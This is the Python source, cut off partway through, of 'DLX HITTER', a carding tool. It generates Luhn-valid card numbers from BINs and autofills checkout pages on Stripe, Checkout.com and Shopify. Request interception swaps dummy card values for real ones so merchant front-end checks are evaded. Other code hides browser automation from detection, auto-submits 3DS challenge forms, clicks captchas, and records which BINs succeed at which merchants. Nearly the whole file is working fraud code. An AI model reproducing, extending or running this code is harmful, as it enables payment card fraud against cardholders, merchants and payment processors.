#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                         DLX HITTER - ADVANCED HITTING TOOL                    ║
║                          Version: 2.0.0 | Build: 2026                        ║
║                                                                               ║
║  Features:                                                                    ║
║  ✓ Anti-Detection & Fingerprint Randomization                                 ║
║  ✓ AI-Powered Card Pattern Learning                                          ║
║  ✓ Smart Rate Limiting & Timing Optimization                                 ║
║  ✓ Multi-Threaded Concurrent Hitting                                         ║
║  ✓ 3DS Auto-Bypass & Captcha Solver                                          ║
║  ✓ Proxy Rotation & Quality Testing                                          ║
║  ✓ Multi-Provider Support: 15+ Payment Systems & E‑commerce Platforms        ║
║  ✓ Enhanced URL Analyzer (Static + Playwright Deep Analysis)                 ║
║  ✓ Real-time Terminal Dashboard                                              ║
║  ✓ Auto-Learning System                                                       ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""

import re
import json
import time
import random
import sqlite3
import asyncio
import requests
import urllib3
import sys
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from collections import defaultdict
from playwright.async_api import async_playwright, Page, Route, Request

# ============= CONFIGURATION =============
DATABASE = "dlx_hitter.db"
MAX_ATTEMPTS = 100
REQUEST_TIMEOUT = 15
MAX_CONCURRENT = 3

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
]

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============= COLORED OUTPUT =============
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def print_banner():
    banner = f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.END}
{Colors.RED}{Colors.BOLD}║{Colors.YELLOW}  ██████╗ ██╗     ██╗  ██╗      ██╗  ██╗██╗████████╗████████╗███████╗██████╗  {Colors.RED}{Colors.BOLD}║{Colors.END}
{Colors.RED}{Colors.BOLD}║{Colors.YELLOW}  ██╔══██╗██║     ╚██╗██╔╝      ██║  ██║██║╚══██╔══╝╚══██╔══╝██╔════╝██╔══██╗ {Colors.RED}{Colors.BOLD}║{Colors.END}
{Colors.RED}{Colors.BOLD}║{Colors.YELLOW}  ██║  ██║██║      ╚███╔╝       ███████║██║   ██║      ██║   █████╗  ██████╔╝ {Colors.RED}{Colors.BOLD}║{Colors.END}
{Colors.RED}{Colors.BOLD}║{Colors.YELLOW}  ██║  ██║██║      ██╔██╗       ██╔══██║██║   ██║      ██║   ██╔══╝  ██╔══██╗ {Colors.RED}{Colors.BOLD}║{Colors.END}
{Colors.RED}{Colors.BOLD}║{Colors.YELLOW}  ██████╔╝███████╗██╔╝ ██╗      ██║  ██║██║   ██║      ██║   ███████╗██║  ██║ {Colors.RED}{Colors.BOLD}║{Colors.END}
{Colors.RED}{Colors.BOLD}║{Colors.YELLOW}  ╚═════╝ ╚══════╝╚═╝  ╚═╝      ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═╝ {Colors.RED}{Colors.BOLD}║{Colors.END}
{Colors.RED}{Colors.BOLD}║{Colors.CYAN}                    ADVANCED HITTING TOOL - VERSION 2.0                        {Colors.RED}{Colors.BOLD}║{Colors.END}
{Colors.RED}{Colors.BOLD}║{Colors.GREEN}              Anti-Detection | AI Learning | Smart Rate Limit                  {Colors.RED}{Colors.BOLD}║{Colors.END}
{Colors.RED}{Colors.BOLD}║{Colors.GREEN}      15+ Payment Systems & E‑commerce Platforms | Multi-Provider             {Colors.RED}{Colors.BOLD}║{Colors.END}
{Colors.RED}{Colors.BOLD}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.END}
    """
    print(banner)
    print(f"{Colors.CYAN}[+] DLX HITTER v3.0.0 Starting...{Colors.END}")
    print(f"{Colors.CYAN}[+] Database: {DATABASE} | Max Concurrent: {MAX_CONCURRENT}{Colors.END}\n")

# ============= PROVIDER DETECTION =============
def detect_provider(url: str, html: str = "") -> str:
    """Return provider name based on URL or HTML content."""
    if 'stripe.com' in url:
        return 'stripe'
    if 'checkout.com' in url or 'checkout' in url:
        return 'checkoutcom'
    if 'shopify.com' in url or 'myshopify.com' in url:
        return 'shopify'
    if 'paypal.com' in url or 'paypal' in url:
        return 'paypal'
    if 'braintree' in url or 'braintreegateway.com' in url:
        return 'braintree'
    if 'adyen.com' in url or 'adyen' in url:
        return 'adyen'
    if 'squareup.com' in url or 'square' in url:
        return 'square'
    if 'mollie.com' in url or 'mollie' in url:
        return 'mollie'
    if 'klarna.com' in url or 'klarna' in url:
        return 'klarna'
    if 'authorize.net' in url or 'authorizenet' in url:
        return 'authorizenet'
    if 'woocommerce' in url or 'woocommerce' in html:
        return 'woocommerce'
    if 'bigcommerce.com' in url or 'bigcommerce' in html:
        return 'bigcommerce'
    if 'wix.com' in url or 'wix' in html:
        return 'wix'
    if 'ecwid.com' in url or 'ecwid' in html:
        return 'ecwid'
    if html:
        if 'stripe.com' in html:
            return 'stripe'
        if 'checkout.com' in html or 'Frames' in html:
            return 'checkoutcom'
        if 'Shopify' in html or 'window.Shopify' in html:
            return 'shopify'
        if 'paypal' in html or 'window.paypal' in html:
            return 'paypal'
        if 'braintree' in html or 'Braintree' in html:
            return 'braintree'
        if 'adyen' in html or 'Adyen' in html:
            return 'adyen'
        if 'square' in html or 'Square' in html:
            return 'square'
        if 'mollie' in html or 'Mollie' in html:
            return 'mollie'
        if 'klarna' in html or 'Klarna' in html:
            return 'klarna'
        if 'authorize.net' in html or 'Authorize.Net' in html:
            return 'authorizenet'
    return 'unknown'

# ============= ENHANCED URL ANALYZER =============
class URLAnalyzer:
    @staticmethod
    def _extract_from_scripts(html: str) -> Dict:
        result = {'amount': None, 'product': None, 'merchant': None, 'product_url': None}
        script_pattern = re.compile(r'<script[^>]*>(.*?)</script>', re.DOTALL)
        for script in script_pattern.findall(html):
            patterns = [
                (r'window\.__STRIPE__\s*=\s*({.*?});', 'stripe'),
                (r'window\.__INITIAL_STATE__\s*=\s*({.*?});', 'initial'),
                (r'var\s+stripePaymentData\s*=\s*({.*?});', 'payment'),
                (r'"paymentIntent":({.*?})', 'pi'),
                (r'"paymentMethod":({.*?})', 'pm'),
                (r'"amount":\s*(\d+)', 'amount'),
                (r'"name":\s*"([^"]+)"', 'name'),
                (r'"business_name":\s*"([^"]+)"', 'business'),
                (r'"product_url":\s*"([^"]+)"', 'product_url'),
            ]
            for pat, key in patterns:
                m = re.search(pat, script, re.DOTALL)
                if m:
                    try:
                        if key in ('stripe','initial','payment','pi','pm'):
                            data = json.loads(m.group(1))
                            def extract(obj):
                                if isinstance(obj, dict):
                                    if 'amount' in obj and isinstance(obj['amount'], (int, float)):
                                        result['amount'] = obj['amount']
                                    if 'name' in obj and isinstance(obj['name'], str):
                                        result['product'] = obj['name']
                                    if 'business_name' in obj and isinstance(obj['business_name'], str):
                                        result['merchant'] = obj['business_name']
                                    if 'product_url' in obj and isinstance(obj['product_url'], str):
                                        result['product_url'] = obj['product_url']
                                    for v in obj.values():
                                        extract(v)
                                elif isinstance(obj, list):
                                    for item in obj:
                                        extract(item)
                            extract(data)
                        elif key == 'amount':
                            result['amount'] = int(m.group(1))
                        elif key == 'name':
                            result['product'] = m.group(1)
                        elif key == 'business':
                            result['merchant'] = m.group(1)
                        elif key == 'product_url':
                            result['product_url'] = m.group(1)
                    except:
                        pass
        return result

    @staticmethod
    def extract_amount(html: str) -> Optional[str]:
        script_data = URLAnalyzer._extract_from_scripts(html)
        if script_data.get('amount') is not None:
            amount_cents = script_data['amount']
            if isinstance(amount_cents, (int, float)):
                return f"${amount_cents/100:.2f}"
        patterns = [
            r'"amount":(\d+)',
            r'"amount_display":"([^"]+)"',
            r'\$(\d+(?:\.\d{2})?)',
            r'data-amount="(\d+)"',
            r'<span[^>]*class="[^"]*amount[^"]*"[^>]*>\s*[\$€£]?\s*([\d,]+\.?\d*)\s*</span>',
            r'Total:?\s*[\$€£]?\s*([\d,]+\.?\d*)',
            r'price["\']\s*:\s*["\']?\$?([\d,]+\.?\d*)',
            r'"line_items":\[.*?"amount":(\d+).*?\]',
            r'"amount_subtotal":(\d+)',
            r'"total":(\d+)'
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                amount = match.group(1).replace(',', '')
                if amount.isdigit() and len(amount) > 2:
                    return f"${int(amount)/100:.2f}"
                elif amount.replace('.', '').isdigit():
                    return f"${amount}"
        return None

    @staticmethod
    def extract_product_name(html: str) -> Optional[str]:
        script_data = URLAnalyzer._extract_from_scripts(html)
        if script_data.get('product'):
            return script_data['product']
        patterns = [
            r'"name":"([^"]+)"',
            r'<title>(.*?)</title>',
            r'<h1[^>]*>(.*?)</h1>',
            r'"description":"([^"]+)"',
            r'"product_name":"([^"]+)"',
            r'<meta property="og:title" content="([^"]+)"',
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                name = match.group(1).strip()
                name = re.sub(r'\s*[|–-]\s*Stripe.*$', '', name, flags=re.IGNORECASE)
                name = re.sub(r'\s*[|–-]\s*Checkout.*$', '', name, flags=re.IGNORECASE)
                if name and len(name) > 3:
                    return name[:100]
        return None

    @staticmethod
    def extract_product_url(html: str) -> Optional[str]:
        script_data = URLAnalyzer._extract_from_scripts(html)
        if script_data.get('product_url'):
            return script_data['product_url']
        patterns = [
            r'<meta property="og:url" content="([^"]+)"',
            r'<link rel="canonical" href="([^"]+)"',
            r'"product_url":"([^"]+)"',
            r'<a[^>]*href="([^"]+)"[^>]*>.*?product.*?</a>',
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                url = match.group(1).strip()
                if url.startswith('http'):
                    return url
        return None

    @staticmethod
    def extract_merchant(html: str) -> str:
        script_data = URLAnalyzer._extract_from_scripts(html)
        if script_data.get('merchant'):
            return script_data['merchant']
        patterns = [
            r'"business_name":"([^"]+)"',
            r'<title>(.*?)\s*[|–-]\s*(Stripe|Checkout|Shopify|PayPal|Braintree|Adyen|Square|Mollie|Klarna|Authorize\.Net|WooCommerce|BigCommerce|Wix|Ecwid)',
            r'"display_name":"([^"]+)"',
            r'<meta property="og:site_name" content="([^"]+)"',
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                return match.group(1).strip()
        return "Unknown"

    @staticmethod
    def extract_currency(html: str) -> str:
        patterns = [
            r'"currency":"([^"]+)"',
            r'data-currency="([^"]+)"',
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                return match.group(1).upper()
        return "USD"

    @staticmethod
    async def deep_analyze_with_playwright(url: str) -> Dict:
        """Playwright ile sayfayı yükler ve JavaScript çalıştıktan sonra bilgileri çeker."""
        result = {
            'merchant': 'Unknown',
            'product': 'Unknown',
            'product_url': None,
            'amount': None,
            'currency': 'USD',
            'success': False
        }
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True, args=['--disable-blink-features=AutomationControlled', '--no-sandbox'])
                context = await browser.new_context(ignore_https_errors=True)
                page = await context.new_page()
                await page.goto(url, timeout=60000, wait_until='domcontentloaded')
                await asyncio.sleep(3)
                
                merchant = await page.evaluate('''() => {
                    const meta = document.querySelector('meta[property="og:site_name"]');
                    if (meta) return meta.content;
                    const title = document.title;
                    const match = title.match(/(.+?)\s*[|–-]\s*(Stripe|Checkout|Shopify|PayPal|Braintree|Adyen|Square|Mollie|Klarna|Authorize\.Net|WooCommerce|BigCommerce|Wix|Ecwid)/);
                    if (match) return match[1];
                    return title;
                }''')
                if merchant and merchant not in ['Stripe Checkout', 'Checkout', 'Shopify Checkout', 'PayPal']:
                    result['merchant'] = merchant.strip()
                
                product = await page.evaluate('''() => {
                    const meta = document.querySelector('meta[property="og:title"]');
                    if (meta) return meta.content;
                    const h1 = document.querySelector('h1');
                    if (h1) return h1.innerText;
                    return document.title;
                }''')
                if product and product not in ['Stripe Checkout', 'Checkout', 'Shopify Checkout']:
                    result['product'] = product.strip()
                
                product_url = await page.evaluate('''() => {
                    const meta = document.querySelector('meta[property="og:url"]');
                    if (meta) return meta.content;
                    const link = document.querySelector('link[rel="canonical"]');
                    if (link) return link.href;
                    return null;
                }''')
                if product_url:
                    result['product_url'] = product_url
                
                amount_text = await page.evaluate('''() => {
                    const selectors = ['[data-amount]', '.amount', '.price', '[class*="amount"]', '[class*="price"]'];
                    for (let sel of selectors) {
                        const el = document.querySelector(sel);
                        if (el) {
                            let text = el.innerText || el.getAttribute('data-amount');
                            if (text) return text;
                        }
                    }
                    return null;
                }''')
                if amount_text:
                    match = re.search(r'[\$€£]?\s*([\d,]+\.?\d*)', amount_text)
                    if match:
                        amount = match.group(1).replace(',', '')
                        result['amount'] = f"${amount}"
                
                currency = await page.evaluate('''() => {
                    const meta = document.querySelector('meta[property="og:price:currency"]');
                    if (meta) return meta.content;
                    const el = document.querySelector('[data-currency]');
                    if (el) return el.getAttribute('data-currency');
                    return null;
                }''')
                if currency:
                    result['currency'] = currency.upper()
                
                result['success'] = True
                await browser.close()
        except Exception as e:
            result['error'] = str(e)
        return result

    @staticmethod
    async def analyze_url_with_fallback(url: str, use_deep: bool = False) -> Dict:
        result = {
            'url': url,
            'merchant': 'Unknown',
            'product': 'Unknown',
            'product_url': None,
            'amount': None,
            'currency': 'USD',
            'success': False,
            'error': None
        }
        try:
            headers = {'User-Agent': random.choice(USER_AGENTS), 'Accept-Language': 'en-US,en;q=0.9'}
            resp = requests.get(url, timeout=15, verify=False, headers=headers, allow_redirects=True)
            if resp.status_code == 200:
                html = resp.text
                result['merchant'] = URLAnalyzer.extract_merchant(html)
                result['product'] = URLAnalyzer.extract_product_name(html) or 'Unknown'
                result['product_url'] = URLAnalyzer.extract_product_url(html)
                result['amount'] = URLAnalyzer.extract_amount(html)
                result['currency'] = URLAnalyzer.extract_currency(html)
                result['success'] = True
            else:
                result['error'] = f"HTTP {resp.status_code}"
        except Exception as e:
            result['error'] = str(e)
        
        if use_deep and (result['merchant'] == 'Unknown' or result['product'] in ['Stripe Checkout', 'Checkout', 'Shopify Checkout']):
            print(f"{Colors.YELLOW}[!] Static analysis incomplete, performing deep analysis with Playwright...{Colors.END}")
            deep = await URLAnalyzer.deep_analyze_with_playwright(url)
            if deep['success']:
                if deep['merchant'] != 'Unknown':
                    result['merchant'] = deep['merchant']
                if deep['product'] != 'Unknown':
                    result['product'] = deep['product']
                if deep['product_url']:
                    result['product_url'] = deep['product_url']
                if deep['amount']:
                    result['amount'] = deep['amount']
                if deep['currency'] != 'USD':
                    result['currency'] = deep['currency']
        return result

# ============= DATABASE SETUP =============
def init_db():
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS bins (id INTEGER PRIMARY KEY AUTOINCREMENT, bin TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS cards (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        card_number TEXT, month TEXT, year TEXT, cvv TEXT,
        success_count INTEGER DEFAULT 0, fail_count INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS hits (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT, card TEXT, merchant TEXT, product TEXT, amount TEXT,
        success INTEGER, decline_code TEXT, receipt_url TEXT, response_time REAL
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS patterns (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        merchant TEXT, bin_pattern TEXT, success_count INTEGER DEFAULT 0, fail_count INTEGER DEFAULT 0
    )''')
    conn.commit()
    conn.close()
    print(f"{Colors.GREEN}[✓] Database initialized{Colors.END}")

# ============= FINGERPRINT =============
class FingerprintGenerator:
    @staticmethod
    def generate() -> Dict:
        return {
            'user_agent': random.choice(USER_AGENTS),
            'viewport': {'width': 1920, 'height': 1080},
            'locale': 'en-US',
            'timezone_id': 'America/New_York'
        }
    
    @staticmethod
    def get_stealth_script() -> str:
        return """
        Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
        window.chrome = { runtime: {} };
        Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
        """

# ============= CARD PATTERN LEARNER =============
class CardPatternLearner:
    def __init__(self):
        self.patterns: Dict[str, Dict[str, Dict]] = defaultdict(dict)
    
    def learn(self, card: Dict, merchant: str, success: bool):
        bin_pattern = card['card'][:6]
        if merchant not in self.patterns:
            self.patterns[merchant] = {}
        if bin_pattern not in self.patterns[merchant]:
            self.patterns[merchant][bin_pattern] = {'success': 0, 'fail': 0}
        if success:
            self.patterns[merchant][bin_pattern]['success'] += 1
        else:
            self.patterns[merchant][bin_pattern]['fail'] += 1
    
    def suggest_best_pattern(self, merchant: str) -> Optional[str]:
        if merchant not in self.patterns:
            return None
        best = None
        best_rate = -1
        for pattern, data in self.patterns[merchant].items():
            total = data['success'] + data['fail']
            if total > 0:
                rate = data['success'] / total * 100
                if rate > best_rate and data['success'] >= 2:
                    best_rate = rate
                    best = pattern
        return best

# ============= SMART RATE LIMITER =============
class SmartRateLimiter:
    def __init__(self):
        self.current_delay = 1.0
        self.consecutive_failures = 0
    
    def calculate_delay(self, last_result: str) -> float:
        if last_result == 'success':
            self.consecutive_failures = 0
            self.current_delay = max(0.5, self.current_delay * 0.9)
        elif last_result == 'declined':
            self.consecutive_failures += 1
            self.current_delay = min(8, self.current_delay * 1.2 + self.consecutive_failures * 0.2)
        return max(0.5, min(10, self.current_delay))

# ============= CARD GENERATOR =============
class CardGenerator:
    @staticmethod
    def get_card_brand(card_number: str) -> str:
        first6 = re.sub(r'\D', '', card_number)[:6]
        if re.match(r'^3[47]', first6): return 'amex'
        if re.match(r'^5[1-5]', first6) or re.match(r'^2[2-7]', first6): return 'mastercard'
        if re.match(r'^4', first6): return 'visa'
        return 'unknown'
    
    @staticmethod
    def luhn_checksum(card_number: str) -> int:
        def digits_of(n): return [int(d) for d in str(n)]
        digits = digits_of(card_number)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(digits_of(d * 2))
        return checksum % 10
    
    @staticmethod
    def generate_card(bin_number: str) -> Optional[Dict]:
        if not bin_number or len(bin_number) < 4:
            return None
        
        parts = bin_number.split('|')
        bin_pattern = re.sub(r'[^0-9xX]', '', parts[0])
        test_bin = bin_pattern.replace('x', '0').replace('X', '0')
        brand = CardGenerator.get_card_brand(test_bin)
        
        target_len = 15 if brand == 'amex' else 16
        cvv_len = 4 if brand == 'amex' else 3
        
        card = ''
        for c in bin_pattern:
            card += str(random.randint(0, 9)) if c.lower() == 'x' else c
        
        remaining = target_len - len(card) - 1
        for _ in range(remaining):
            card += str(random.randint(0, 9))
        
        for i in range(10):
            if CardGenerator.luhn_checksum(card + str(i)) == 0:
                check_digit = i
                break
        else:
            check_digit = 0
        
        full_card = card + str(check_digit)
        
        month = f"{random.randint(1, 12):02d}"
        if len(parts) > 1 and parts[1]:
            month = parts[1].zfill(2) if parts[1].lower() != 'xx' else f"{random.randint(1, 12):02d}"
        
        year = f"{datetime.now().year + random.randint(1, 5):02d}"
        if len(parts) > 2 and parts[2]:
            year = parts[2].zfill(2) if parts[2].lower() != 'xx' else f"{datetime.now().year + random.randint(1, 5):02d}"
        
        cvv = ''.join(str(random.randint(0, 9)) for _ in range(cvv_len))
        if len(parts) > 3 and parts[3]:
            if parts[3].lower() in ('xxx', 'xxxx'):
                cvv = ''.join(str(random.randint(0, 9)) for _ in range(cvv_len))
            else:
                cvv = parts[3].zfill(cvv_len)
        
        return {'card': full_card, 'month': month, 'year': year, 'cvv': cvv, 'brand': brand}
    
    @staticmethod
    def generate_cards(bin_number: str, count: int = 10) -> List[Dict]:
        cards = []
        for _ in range(count):
            card = CardGenerator.generate_card(bin_number)
            if card:
                cards.append(card)
        return cards

# ============= BASE AUTOFILL CLASS =============
class BaseAutofill:
    def __init__(self, page: Page):
        self.page = page
        self.real_card = None
    
    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        # To be overridden
    
    async def fill_card(self, card: Dict):
        # To be overridden
        pass
    
    async def submit(self) -> bool:
        # To be overridden
        return False
    
    async def detect_3ds(self) -> bool:
        iframes = await self.page.query_selector_all('iframe[src*="3ds"], iframe[src*="challenge"]')
        for iframe in iframes:
            if await iframe.is_visible():
                return True
        text = await self.page.text_content('body')
        if '3D Secure' in text or 'Authentication' in text:
            return True
        return False
    
    async def wait_for_3ds(self, timeout: int = 10000) -> bool:
        start = time.time()
        while (time.time() - start) * 1000 < timeout:
            if await self.detect_3ds():
                return True
            await asyncio.sleep(0.5)
        return False
    
    async def auto_complete_3ds(self) -> bool:
        if not await self.detect_3ds():
            return False
        form = await self.page.query_selector('form')
        if form:
            await form.evaluate('form => form.submit()')
            await asyncio.sleep(3)
            return True
        cont = await self.page.query_selector('button:has-text("Continue"), button:has-text("Submit")')
        if cont:
            await cont.click()
            await asyncio.sleep(3)
            return True
        return False
    
    async def handle_captcha(self):
        try:
            frame = self.page.frame_locator('iframe[src*="hcaptcha.com"]')
            if frame:
                checkbox = frame.locator('#checkbox').first
                if await checkbox.is_visible():
                    await checkbox.click()
                    await asyncio.sleep(2)
                    return True
        except:
            pass
        return False

# ============= STRIPE AUTOFILL =============
class StripeAutofill(BaseAutofill):
    CARD_SELECTORS = [
        '#cardNumber', '[name="cardNumber"]', '[autocomplete="cc-number"]',
        '[data-elements-stable-field-name="cardNumber"]',
        'input[placeholder*="Card number"]', 'input[placeholder*="card number"]',
        'input[aria-label*="Card number"]', '[class*="CardNumberInput"] input',
        'input[name="number"]', 'input[id*="card-number"]'
    ]
    
    EXPIRY_SELECTORS = [
        '#cardExpiry', '[name="cardExpiry"]', '[autocomplete="cc-exp"]',
        '[data-elements-stable-field-name="cardExpiry"]',
        'input[placeholder*="MM / YY"]', 'input[placeholder*="MM/YY"]',
        'input[placeholder*="MM"]', '[class*="CardExpiry"] input'
    ]
    
    CVC_SELECTORS = [
        '#cardCvc', '[name="cardCvc"]', '[autocomplete="cc-csc"]',
        '[data-elements-stable-field-name="cardCvc"]',
        'input[placeholder*="CVC"]', 'input[placeholder*="CVV"]',
        '[class*="CardCvc"] input', 'input[name="cvc"]'
    ]
    
    NAME_SELECTORS = [
        '#billingName', '[name="billingName"]', '[autocomplete="cc-name"]',
        'input[placeholder*="Name on card"]', 'input[name="name"]'
    ]
    
    EMAIL_SELECTORS = [
        'input[type="email"]', 'input[name*="email"]', 'input[autocomplete="email"]',
        'input[placeholder*="email"]'
    ]
    
    SUBMIT_SELECTORS = [
        '.SubmitButton', '[class*="SubmitButton"]', 'button[type="submit"]',
        '[data-testid*="submit"]', 'button:has-text("Pay")'
    ]
    
    MASKED_CARD = "0000000000000000"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "000"
    
    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and "stripe.com" in request.url:
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace("card[number]=0000000000000000", f"card[number]={self.real_card['card']}")
                    post_data = post_data.replace("card[exp_month]=01", f"card[exp_month]={self.real_card['month']}")
                    post_data = post_data.replace("card[exp_year]=30", f"card[exp_year]={self.real_card['year']}")
                    post_data = post_data.replace("card[cvc]=000", f"card[cvc]={self.real_card['cvv']}")
                    post_data = post_data.replace("card[expiry]=01/30", f"card[expiry]={self.real_card['month']}/{self.real_card['year']}")
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()
        
        await self.page.route("**/*", intercept_route)
    
    async def find_and_fill_field(self, selectors: List[str], value: str):
        for sel in selectors:
            try:
                element = await self.page.query_selector(sel)
                if element and await element.is_visible():
                    await element.click()
                    await element.fill(value)
                    return True
            except:
                continue
        return False
    
    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
        email = f"dlx{random.randint(100,9999)}@example.com"
        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
    
    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except:
                continue
        return False

# ============= CHECKOUT.COM AUTOFILL =============
class CheckoutComAutofill(BaseAutofill):
    CARD_SELECTORS = [
        'input[data-frames="card-number"]', '#card-number', 'input[name="cardNumber"]',
        'input[placeholder*="Card number"]', 'input[aria-label*="Card number"]',
        '[data-testid="card-number"]', '#payment-card-number'
    ]
    
    EXPIRY_SELECTORS = [
        'input[data-frames="expiry-date"]', '#expiry-date', 'input[name="expiry"]',
        'input[placeholder*="MM/YY"]', 'input[placeholder*="MM / YY"]',
        '[data-testid="expiry-date"]'
    ]
    
    CVC_SELECTORS = [
        'input[data-frames="cvv"]', '#cvv', 'input[name="cvv"]',
        'input[placeholder*="CVC"]', 'input[placeholder*="CVV"]',
        '[data-testid="cvv"]'
    ]
    
    NAME_SELECTORS = [
        'input[data-frames="name"]', '#name', 'input[name="name"]',
        'input[placeholder*="Name on card"]', '[data-testid="cardholder-name"]'
    ]
    
    EMAIL_SELECTORS = [
        'input[type="email"]', '#email', 'input[name="email"]',
        'input[placeholder*="email"]'
    ]
    
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
        'button:has-text("Pay")', 'button:has-text("Submit")'
    ]
    
    MASKED_CARD = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "123"
    
    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and ("checkout.com" in request.url or "api.checkout.com" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    post_data = re.sub(r'"expiryMonth":"01"', f'"expiryMonth":"{self.real_card["month"]}"', post_data)
                    post_data = re.sub(r'"expiryYear":"30"', f'"expiryYear":"{self.real_card["year"]}"', post_data)
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()
        
        await self.page.route("**/*", intercept_route)
    
    async def find_and_fill_field(self, selectors: List[str], value: str):
        for sel in selectors:
            try:
                element = await self.page.query_selector(sel)
                if element and await element.is_visible():
                    await element.click()
                    await element.fill(value)
                    return True
            except:
                continue
        return False
    
    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
        email = f"dlx{random.randint(100,9999)}@example.com"
        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
    
    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except:
                continue
        return False

# ============= SHOPIFY AUTOFILL =============
class ShopifyAutofill(BaseAutofill):
    CARD_SELECTORS = [
        '#number', 'input[name="number"]', '[autocomplete="cc-number"]',
        'input[aria-label="Card number"]', '[data-testid="card-number"]',
        'input[placeholder*="Card number"]', '.card-number'
    ]
    
    EXPIRY_SELECTORS = [
        '#expiry', 'input[name="expiry"]', '[autocomplete="cc-exp"]',
        'input[aria-label="Expiry date"]', '[data-testid="expiry-date"]',
        'input[placeholder*="MM/YY"]', '.expiry-date'
    ]
    
    CVC_SELECTORS = [
        '#verification_value', 'input[name="verification_value"]', '[autocomplete="cc-csc"]',
        'input[aria-label="Security code"]', '[data-testid="security-code"]',
        'input[placeholder*="CVC"]', '.cvv'
    ]
    
    NAME_SELECTORS = [
        '#name', 'input[name="name"]', '[autocomplete="cc-name"]',
        'input[aria-label="Name on card"]', '[data-testid="cardholder-name"]'
    ]
    
    EMAIL_SELECTORS = [
        '#email', 'input[name="email"]', 'input[type="email"]',
        'input[aria-label="Email"]', '[data-testid="email"]'
    ]
    
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '[data-testid="pay-button"]', '.pay-button',
        'button:has-text("Pay")', 'button:has-text("Complete order")'
    ]
    
    MASKED_CARD = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "123"
    
    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        
        async def intercept_route(route: Route, request: Request):
